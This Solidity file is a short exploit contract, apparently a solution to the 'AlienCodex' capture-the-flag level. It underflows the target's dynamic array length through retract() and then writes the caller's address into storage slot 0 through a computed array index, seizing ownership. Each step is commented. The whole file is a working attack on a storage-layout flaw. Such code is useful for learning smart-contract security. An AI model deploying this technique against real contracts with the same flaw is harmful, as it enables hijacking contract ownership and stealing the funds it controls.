// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

contract AttackAlienCodex {
    constructor(IAlienCodex target){
        // the slot number of owner is 0
        target.makeContact();
        // make the length of 'codex' in target contract type(uint).max
        target.retract();
        // the slot of index 0 of 'codex' is keccak256(1)
        uint indexToSlot0 = type(uint).max - uint(keccak256(abi.encodePacked(uint(1)))) + 1;
        target.revise(indexToSlot0, bytes32(uint(uint160(msg.sender))));
    }
}
